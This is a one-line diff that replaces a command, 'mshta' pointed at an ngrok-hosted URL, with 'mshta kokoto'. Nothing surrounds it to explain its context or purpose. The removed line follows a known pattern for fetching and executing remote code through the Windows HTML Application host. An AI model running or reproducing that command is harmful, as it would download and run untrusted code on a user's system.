@@ -1,1 +1,1 @@
-mshta http://2f9c-79-110-37-21.ngrok-free.app/cxNJg
+mshta kokoto
